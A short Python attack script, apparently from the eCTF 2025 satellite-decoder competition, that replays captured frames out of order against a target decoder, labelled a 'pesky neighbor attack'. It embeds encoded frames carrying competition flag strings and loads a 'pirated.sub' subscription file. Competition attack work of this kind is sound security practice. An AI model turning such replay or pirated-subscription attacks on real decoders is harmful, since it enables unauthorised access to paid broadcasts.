import time
import sys
import struct
import json

from ectf25.utils.decoder import DecoderIntf

# first set from satellite
ch1_frame = {"channel": 1, "timestamp": 1677287473550611, "encoded": "00e500367ac7848aada1b4a9ab0e1c8e01000000a442f26713150cec7bf50500cc484c4ee28aeba0679dab106e3d30344b82303119cb355120077a707a05c8e48a4652f8e024674ac2bfde67fd9c5d63bd91d4f98ef51e301761feb1c2258e8a16459be23632e4fb46bf61dfaf78e28b447cc81e44d0cccfe2dacad30b4e963b2ee746b2f6a6336c83b9b33a010b3d61"}
ch3_frame = {"channel": 3, "timestamp": 1677287473550960, "encoded": "bf0d64f5bd8d522e792e5866f05ae4b803000000a442f26770160cec7bf50500f2c191aed306cb6c868eca5014d9fd79360cc24eb4ee5e6682505f769f3fe37dbca5afc56aa0c50619ea1712c3e3310e1c8e04a5870bc1d70d9326803509d9377ca3676b9951df5e7f194b4a6c0c8666bf48aefcb898bf3fdf5f9af8888930a33c57606f8ef2238b9c8d2843e96700cd"}
ch4_frame = {"channel": 4, "timestamp": 1677287473551053, "encoded": "3921fd3bfd04c637ebc59e32212b3fcd04000000a442f267cd160cec7bf5050076c78b2d0fdb7e48e581cbfc26c9e422a5d02a54f9d93f9756e5563590adef535fd679a0ba59ae8fd2d2e57216c469c41569777e2dcec3fde6b98e954f7b14fa48f987f90f1708146e5766d66978938680bf6ae1b05c8534d2fa27a0d457d9f1535159194432f4489566896d40b42fd7"}
ch2_frame = {"channel": 2, "timestamp": 1677287473550856, "encoded": "aa024248c1611d6901e15f6d844b53d702000000a442f26708160cec7bf50500f0a345a5e24cbf4f5d21040f95dba9a5c6c79188ea50593d879dfc9e2c6d98eec57120f68dd6fcbb462c22fa56f2f4e4cf050961e9b9130aa8c256e76b3216617c31e595ad16bbb8690127b76ce7e566f113bc42f0074014b996f59ee98d29c05feacecd1e5f28cdfd32bed37da4e43f"}
ch0_frame = {"channel": 0, "timestamp": 1677287473893932, "encoded": "0000000000000000000000000000000000000000a542f2672c5211ec7bf505006e6f666c61676f6e746869736368616e5e20666c6167205e303030356635376265633131353232635e2074696d65205e61303861346462643734306339613866d8ae774e6a374353ee3aac043754b1c9924f22bb204d98f7c3407e5f71468aa3"}

# second set from satellite
_ch3_frame = {"channel": 3, "timestamp": 1677287496112174, "encoded": "a26ec27a4247546aadca8c0860cdd07a03000000bb42f2672e5864ed7bf505007b35c50355979dfe5e202697730c0de54376792068a6e7fc63a7613f4a82c03a67e989ca59204f67aa68ae39fcc1fa4ff3b56294f3152a12e0b7c102eec7c2db24008ebf4f5449541a1d50f1f9a271369f1afd3321fb87f5f3ec4e06abde3d8f5462b21f7e268c75f90fa08037d6f47f"}
_ch1_frame = {"channel": 1, "timestamp": 1677287496111787, "encoded": "4ddf7f4bd013a871fd3b72e3a640dfc401000000bb42f267ab5664ed7bf50500094311b900c061e0f8a959e28d72baf235f0a76c0c02e89ac7fe4c73639e25422708eab18987ac779a01a644d00943aa6651a195628727b96a70f2d39a1aed79c767f2b00d9370456daeffa50ba02a61ada3f73ce7f327f242f45076ea447e176f2c7d917436bd187c453858c9f69ab5"}
_ch2_frame = {"channel": 2, "timestamp": 1677287496112050, "encoded": "ef5f5256c82805be85906bdc302c611802000000bb42f267b25764ed7bf505000ccea01841b7578f81d5e1991829c0eedd619377b417124c5a25629131595ae84da40aeb33e2601a9bd4a93d79ce79023af876bdff16be003a1e6b2ca453ad59523ff876a297ebf708ae9709d0832b21ba65c044e82eedc4282606a4e382e57e0e49a48ddb0f58079bbc9200c8b9423d"}
_ch4_frame = {"channel": 4, "timestamp": 1677287496112263, "encoded": "aa86142817c964fad42484e6c77044c004000000bb42f267875864ed7bf5050030f82d62161f4b07660e16279be14547cba22df93abf18da83cd2f3aa7558ad0754f07603c8c2eb2bb24f0f292f9e8f790773a4a596f4a5b9c64d23f3da07c06ec8bbb4796b327fa5c0099e71a462b0d55ae625beec1097d30890d21dd4dc7659d3469383a61b0d1d4027e8aecc2282b"}
_ch0_frame = {"channel": 0, "timestamp": 1677287503897114, "encoded": "0000000000000000000000000000000000000000c342f2671a22dbed7bf505006e6f666c61676f6e746869736368616e5e20666c6167205e303030356635376265646462323231615e2074696d65205e37636564656162303534326435643266bc961e75014fdc8db2d90ebeece9a06b6d8ed72198bf2bb299925d45a18823e2"}

# recording
with open("recording.json", "r") as f:
    recording = json.load(f)

# subscription package
with open("pirated.sub", "rb") as f:
    pirated = f.read()


if __name__ == "__main__":
    print("Running pesky neighbor attack")

    time.sleep(1)

    decoder = DecoderIntf(sys.argv[1])

    decoder.list()

    decoder.decode(bytes.fromhex(_ch0_frame["encoded"]))
    decoder.decode(bytes.fromhex(ch0_frame["encoded"]))

    print("Successfully decoded earlier frame")
